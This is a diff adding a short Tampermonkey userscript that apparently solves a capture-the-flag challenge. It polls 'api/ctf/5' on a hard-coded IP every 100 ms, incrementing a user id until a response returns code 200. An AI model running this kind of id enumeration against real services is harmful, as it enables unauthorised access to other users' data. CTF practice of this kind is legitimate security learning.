@@ -1,0 +1,28 @@
+// ==UserScript==
+// @name         New Userscript
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  try to take over the world!
+// @author       You
+// @match        http://45.113.201.36/user.html
+// @grant        none
+// @require      https://cdn.jsdelivr.net/npm/jquery@3.4.0/dist/jquery.min.js
+// ==/UserScript==
+
+(function() {
+    'use strict';
+       var uid =100336889
+       var loop = setInterval(function(){
+       $.ajax({
+                url: "api/ctf/5?uid=" + uid,
+                type: "get",
+                success:function (data) {
+                    if(data.code ==200){
+                    console.log("找到"+data.data)
+                    clearInterval(loop);
+       }
+       }
+              })
+           uid++;
+       },100);
+})();
